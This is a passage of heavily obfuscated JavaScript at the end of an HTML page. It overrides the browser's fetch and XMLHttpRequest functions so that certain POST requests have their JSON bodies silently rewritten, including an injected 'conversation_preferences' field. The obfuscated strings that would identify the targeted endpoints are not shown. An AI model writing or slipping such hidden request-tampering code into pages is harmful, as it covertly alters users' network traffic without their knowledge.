_0x28302d=_0x577d38,_0xe88477={'LRaln':_0x5777de[_0x28302d(0x23e)],'sQyUt':function(_0x1d331a){const _0x4265b3=_0x28302d;return _0x5777de[_0x4265b3(0x29c)](_0x1d331a);},'CuCEs':function(_0x2c80e6,_0x3a324a){const _0x5c09cf=_0x28302d;return _0x5777de[_0x5c09cf(0x26a)](_0x2c80e6,_0x3a324a);},'aUTjl':_0x5777de[_0x28302d(0x293)],'FRUfX':_0x5777de[_0x28302d(0x2b5)],'FYvFQ':function(_0x5d7f4a,_0x3ac373){const _0x22bc49=_0x28302d;return _0x5777de[_0x22bc49(0x2de)](_0x5d7f4a,_0x3ac373);},'gOCIM':_0x5777de[_0x28302d(0x208)],'anwDs':_0x5777de[_0x28302d(0x1e0)],'BZEBt':_0x5777de[_0x28302d(0x1f0)],'CYPOJ':_0x5777de[_0x28302d(0x2c6)],'rKIXr':_0x5777de[_0x28302d(0x275)],'VFdgw':_0x5777de[_0x28302d(0x270)],'cZtLm':_0x5777de[_0x28302d(0x1d8)],'IzgPN':_0x5777de[_0x28302d(0x20c)],'smZNl':_0x5777de[_0x28302d(0x1fc)],'TDWGK':function(_0x418da3,_0x20b7c2){const _0xa17689=_0x28302d;return _0x5777de[_0xa17689(0x277)](_0x418da3,_0x20b7c2);},'XPPfw':_0x5777de[_0x28302d(0x2d0)],'ZbUKU':function(_0x1c559b,_0x1745aa){const _0x31358e=_0x28302d;return _0x5777de[_0x31358e(0x2a6)](_0x1c559b,_0x1745aa);},'EXpkL':_0x5777de[_0x28302d(0x305)],'gllWW':function(_0x303453,_0x2b7eb2){const _0x238324=_0x28302d;return _0x5777de[_0x238324(0x330)](_0x303453,_0x2b7eb2);},'VbEeo':function(_0x297ce3,_0x354adb){const _0x1462b2=_0x28302d;return _0x5777de[_0x1462b2(0x330)](_0x297ce3,_0x354adb);},'JHoEe':function(_0x5c248e,_0x8dcf54){const _0x1172b8=_0x28302d;return _0x5777de[_0x1172b8(0x330)](_0x5c248e,_0x8dcf54);},'NIAtY':_0x5777de[_0x28302d(0x319)],'xIFqt':_0x5777de[_0x28302d(0x301)],'NDzRA':function(_0x4262bc,_0x7872d0){const _0x4bd46b=_0x28302d;return _0x5777de[_0x4bd46b(0x266)](_0x4262bc,_0x7872d0);},'mQudm':function(_0x475604,_0x4f7a3b){const _0x4ec142=_0x28302d;return _0x5777de[_0x4ec142(0x2b0)](_0x475604,_0x4f7a3b);},'AmRRY':_0x5777de[_0x28302d(0x227)],'JLiqT':function(_0x1d6bf5,_0x588b2b){const _0x462a00=_0x28302d;return _0x5777de[_0x462a00(0x266)](_0x1d6bf5,_0x588b2b);},'VHUnu':_0x5777de[_0x28302d(0x2d4)],'hzGBi':_0x5777de[_0x28302d(0x332)],'JJlir':function(_0xe875ed,_0x276011){const _0x244d9c=_0x28302d;return _0x5777de[_0x244d9c(0x266)](_0xe875ed,_0x276011);},'LgjXK':function(_0x33ceda,_0x326f63){const _0x3a5dcc=_0x28302d;return _0x5777de[_0x3a5dcc(0x2b1)](_0x33ceda,_0x326f63);}};if(_0x5777de[_0x28302d(0x264)](document[_0x28302d(0x254)],_0x5777de[_0x28302d(0x2fb)])){_0x5777de[_0x28302d(0x1f3)](setTimeout,_0x14563f,0x1*0x2657+-0x2*0x80+0x1*-0x242b);return;}console[_0x28302d(0x207)](_0x5777de[_0x28302d(0x1ee)],_0x5777de[_0x28302d(0x250)]),_0x5777de[_0x28302d(0x29c)](_0x429ccc),_0x5777de[_0x28302d(0x29c)](_0x47c4f4),_0x5777de[_0x28302d(0x29c)](_0x350716);const _0x51823a=new MutationObserver(_0x59d1e9=>{const _0x53662f=_0x28302d;document[_0x53662f(0x23f)+_0x53662f(0x2d2)](_0xe88477[_0x53662f(0x1ff)])&&_0xe88477[_0x53662f(0x230)](_0x47c4f4),_0xe88477[_0x53662f(0x230)](_0x350716);});_0x51823a[_0x28302d(0x248)](document[_0x28302d(0x1eb)],{'childList':!![],'subtree':!![]}),_0x5777de[_0x28302d(0x1f3)](setInterval,_0x47c4f4,-0x2*-0x1342+0x1b4d*0x1+-0x3a01*0x1),_0x5777de[_0x28302d(0x1ea)](setInterval,_0x350716,-0x1ca3+-0x28d*-0x7+0x2*0x758);const _0x4d8b61=window[_0x28302d(0x25f)];window[_0x28302d(0x25f)]=async function(_0x14273e,_0x100e46={}){const _0x23eaad=_0x28302d,_0xc84cad=_0xe88477[_0x23eaad(0x236)](typeof _0x14273e,_0xe88477[_0x23eaad(0x1f6)])?_0x14273e:_0x14273e[_0x23eaad(0x29b)],_0x3a2c5d=(_0x100e46[_0x23eaad(0x1d7)]||(_0x14273e[_0x23eaad(0x1d7)]||_0xe88477[_0x23eaad(0x1fd)]))[_0x23eaad(0x2d3)+'e'](),_0x3b08dc=_0xe88477[_0x23eaad(0x24b)](_0x3a2c5d,_0xe88477[_0x23eaad(0x307)])&&(_0xc84cad[_0x23eaad(0x333)](_0xe88477[_0x23eaad(0x28a)])||_0xc84cad[_0x23eaad(0x333)](_0xe88477[_0x23eaad(0x33c)]))&&_0xc84cad[_0x23eaad(0x333)](_0xe88477[_0x23eaad(0x2dd)])&&!_0xc84cad[_0x23eaad(0x333)](_0xe88477[_0x23eaad(0x22b)])&&!_0xc84cad[_0x23eaad(0x333)](_0xe88477[_0x23eaad(0x30e)])&&!_0xc84cad[_0x23eaad(0x333)](_0xe88477[_0x23eaad(0x276)]),_0x1c60ba=_0xe88477[_0x23eaad(0x24b)](_0x3a2c5d,_0xe88477[_0x23eaad(0x326)])&&_0xc84cad[_0x23eaad(0x333)](_0xe88477[_0x23eaad(0x33e)]);if(_0xe88477[_0x23eaad(0x2b7)](_0x3b08dc,!_0x1c60ba)){console[_0x23eaad(0x207)](_0xe88477[_0x23eaad(0x271)],_0xc84cad);try{if(_0xe88477[_0x23eaad(0x24b)](typeof _0x100e46[_0x23eaad(0x1eb)],_0xe88477[_0x23eaad(0x1f6)])&&_0x100e46[_0x23eaad(0x1eb)][_0x23eaad(0x31a)]()[_0x23eaad(0x2ac)]('{'))return _0x100e46[_0x23eaad(0x1eb)]=_0xe88477[_0x23eaad(0x25e)](_0x2e2736,_0x100e46[_0x23eaad(0x1eb)]),_0x4d8b61[_0x23eaad(0x2f2)](this,_0x14273e,_0x100e46);if(_0x100e46[_0x23eaad(0x1eb)]&&_0xe88477[_0x23eaad(0x24b)](typeof _0x100e46[_0x23eaad(0x1eb)],_0xe88477[_0x23eaad(0x2e9)])&&!_0xe88477[_0x23eaad(0x206)](_0x100e46[_0x23eaad(0x1eb)],FormData)&&!_0xe88477[_0x23eaad(0x268)](_0x100e46[_0x23eaad(0x1eb)],Blob))return _0x100e46[_0x23eaad(0x1eb)]=_0xe88477[_0x23eaad(0x25e)](_0x2e2736,JSON[_0x23eaad(0x27a)](_0x100e46[_0x23eaad(0x1eb)])),_0x4d8b61[_0x23eaad(0x2f2)](this,_0x14273e,_0x100e46);if(_0xe88477[_0x23eaad(0x29a)](_0x14273e,Request)){const _0x587a33=await _0x14273e[_0x23eaad(0x239)]()[_0x23eaad(0x1f1)]();if(_0x587a33[_0x23eaad(0x31a)]()[_0x23eaad(0x2ac)]('{')){const _0x4405e5=_0xe88477[_0x23eaad(0x25e)](_0x2e2736,_0x587a33),_0x2f9523=new Request(_0x14273e[_0x23eaad(0x29b)],{'method':_0x14273e[_0x23eaad(0x1d7)],'headers':_0x14273e[_0x23eaad(0x281)],'body':_0x4405e5,'mode':_0x14273e[_0x23eaad(0x21e)],'credentials':_0x14273e[_0x23eaad(0x261)+'s'],'cache':_0x14273e[_0x23eaad(0x1f5)],'redirect':_0x14273e[_0x23eaad(0x1c5)],'referrer':_0x14273e[_0x23eaad(0x1d6)]});return _0x4d8b61[_0x23eaad(0x2f2)](this,_0x2f9523,_0x100e46);}}}catch(_0x4265c2){console[_0x23eaad(0x278)](_0xe88477[_0x23eaad(0x2a9)],_0x4265c2);}}if(_0x1c60ba){console[_0x23eaad(0x207)](_0xe88477[_0x23eaad(0x2b6)]);try{if(_0xe88477[_0x23eaad(0x2c4)](typeof _0x100e46[_0x23eaad(0x1eb)],_0xe88477[_0x23eaad(0x1f6)])&&_0x100e46[_0x23eaad(0x1eb)][_0x23eaad(0x31a)]()[_0x23eaad(0x2ac)]('{'))_0x100e46[_0x23eaad(0x1eb)]=JSON[_0x23eaad(0x27a)]({...JSON[_0x23eaad(0x32f)](_0x100e46[_0x23eaad(0x1eb)]),'conversation_preferences':_0x3b9583});else{if(_0xe88477[_0x23eaad(0x2c0)](_0x14273e,Request)){const _0x5506b4=await _0x14273e[_0x23eaad(0x239)]()[_0x23eaad(0x1f1)]();if(_0x5506b4[_0x23eaad(0x31a)]()[_0x23eaad(0x2ac)]('{')){const _0x5a03a5=JSON[_0x23eaad(0x32f)](_0x5506b4);_0x5a03a5[_0x23eaad(0x1cf)+_0x23eaad(0x2c2)+_0x23eaad(0x24f)]=_0x3b9583;const _0xd6f9ec=new Request(_0x14273e[_0x23eaad(0x29b)],{'method':_0x14273e[_0x23eaad(0x1d7)],'headers':_0x14273e[_0x23eaad(0x281)],'body':JSON[_0x23eaad(0x27a)](_0x5a03a5),'mode':_0x14273e[_0x23eaad(0x21e)],'credentials':_0x14273e[_0x23eaad(0x261)+'s'],'cache':_0x14273e[_0x23eaad(0x1f5)],'redirect':_0x14273e[_0x23eaad(0x1c5)],'referrer':_0x14273e[_0x23eaad(0x1d6)]});return _0x4d8b61[_0x23eaad(0x2f2)](this,_0xd6f9ec,_0x100e46);}}}}catch(_0x187f49){console[_0x23eaad(0x278)](_0xe88477[_0x23eaad(0x2af)],_0x187f49);}}return _0x4d8b61[_0x23eaad(0x2f2)](this,_0x14273e,_0x100e46);};const _0x33c290=XMLHttpRequest[_0x28302d(0x280)][_0x28302d(0x2bd)],_0x37191b=XMLHttpRequest[_0x28302d(0x280)][_0x28302d(0x222)];XMLHttpRequest[_0x28302d(0x280)][_0x28302d(0x2bd)]=function(_0x534d43,_0x24bd91,..._0x4afad2){const _0x11bc7f=_0x28302d;return this[_0x11bc7f(0x201)+_0x11bc7f(0x300)]=_0xe88477[_0x11bc7f(0x24b)](_0x534d43[_0x11bc7f(0x2d3)+'e'](),_0xe88477[_0x11bc7f(0x326)])&&_0x24bd91[_0x11bc7f(0x333)](_0xe88477[_0x11bc7f(0x33e)]),this[_0x11bc7f(0x2a4)+'PI']=_0xe88477[_0x11bc7f(0x21f)](_0x534d43[_0x11bc7f(0x2d3)+'e'](),_0xe88477[_0x11bc7f(0x307)])&&(_0x24bd91[_0x11bc7f(0x333)](_0xe88477[_0x11bc7f(0x28a)])||_0x24bd91[_0x11bc7f(0x333)](_0xe88477[_0x11bc7f(0x33c)]))&&_0x24bd91[_0x11bc7f(0x333)](_0xe88477[_0x11bc7f(0x2dd)])&&!_0x24bd91[_0x11bc7f(0x333)](_0xe88477[_0x11bc7f(0x22b)])&&!_0x24bd91[_0x11bc7f(0x333)](_0xe88477[_0x11bc7f(0x30e)])&&!_0x24bd91[_0x11bc7f(0x333)](_0xe88477[_0x11bc7f(0x276)]),_0x33c290[_0x11bc7f(0x2f2)](this,_0x534d43,_0x24bd91,..._0x4afad2);},XMLHttpRequest[_0x28302d(0x280)][_0x28302d(0x222)]=function(_0x12ede4){const _0x39c039=_0x28302d;if(this[_0x39c039(0x201)+_0x39c039(0x300)]&&_0xe88477[_0x39c039(0x24b)](typeof _0x12ede4,_0xe88477[_0x39c039(0x1f6)])&&_0x12ede4[_0x39c039(0x31a)]()[_0x39c039(0x2ac)]('{')){console[_0x39c039(0x207)](_0xe88477[_0x39c039(0x295)]);try{const _0x3a8b9c=JSON[_0x39c039(0x32f)](_0x12ede4);_0x3a8b9c[_0x39c039(0x1cf)+_0x39c039(0x2c2)+_0x39c039(0x24f)]=_0x3b9583,_0x12ede4=JSON[_0x39c039(0x27a)](_0x3a8b9c);}catch(_0x56b948){console[_0x39c039(0x278)](_0xe88477[_0x39c039(0x328)],_0x56b948);}}return this[_0x39c039(0x2a4)+'PI']&&!this[_0x39c039(0x201)+_0x39c039(0x300)]&&_0xe88477[_0x39c039(0x2db)](typeof _0x12ede4,_0xe88477[_0x39c039(0x1f6)])&&(_0x12ede4=_0xe88477[_0x39c039(0x203)](_0x2e2736,_0x12ede4)),_0x37191b[_0x39c039(0x2f2)](this,_0x12ede4);},console[_0x28302d(0x207)](_0x5777de[_0x28302d(0x263)],_0x5777de[_0x28302d(0x217)]);};_0x5777de[_0x577d38(0x240)](setTimeout,_0x14563f,-0x1f70+-0x27*0x13+0x31f5);})()));</script>
 </body>
 
 </html>
